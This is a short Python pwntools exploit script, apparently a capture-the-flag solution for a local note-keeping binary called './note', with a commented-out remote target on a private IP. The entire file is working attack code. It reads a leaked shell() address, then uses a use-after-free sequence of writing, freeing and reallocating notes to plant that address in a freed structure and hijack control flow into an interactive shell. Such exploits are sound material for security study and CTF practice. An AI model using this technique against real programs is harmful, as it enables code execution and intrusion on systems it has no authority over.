#!/usr/bin/python
from pwn import *
exe = './note'
elf = context.binary = ELF(exe, checksec = 0)
# context.log_level = 'debug'
context.arch = 'amd64'

def write(index, script, emoj):
    io.sendlineafter(b">>> ", b"1")
    io.sendlineafter(b": ", b"%d" % index)
    io.sendlineafter(b": ", script)
    io.sendlineafter(b">>> ", b"%d" % emoj)

def rewrite(index, script, emoj):
    io.sendlineafter(b">>> ", b"2")
    io.sendlineafter(b": ", b"%d" % index)
    io.sendlineafter(b": ", script)
    io.sendlineafter(b">>> ", b"%d" % emoj)

def read(index):
    io.sendlineafter(b">>> ", b"3")
    io.sendlineafter(b": ", b"%d" % index)

def erase(index):
    io.sendlineafter(b">>> ", b"4")
    io.sendlineafter(b": ", b"%d" % index)

def quit():
    io.sendlineafter(b">>> ", b"5")

io = process(exe)
#io=remote("192.168.0.52", 40000)
io.recvuntil(b"shell(): ")
shell = int(io.recvline(), 16)

write(1, flat({8: shell}), 3)
write(2, b"A" * 0x28, 3)
erase(1)
erase(2)
write(3, flat({8: shell}), 3)
read(1)

io.interactive()
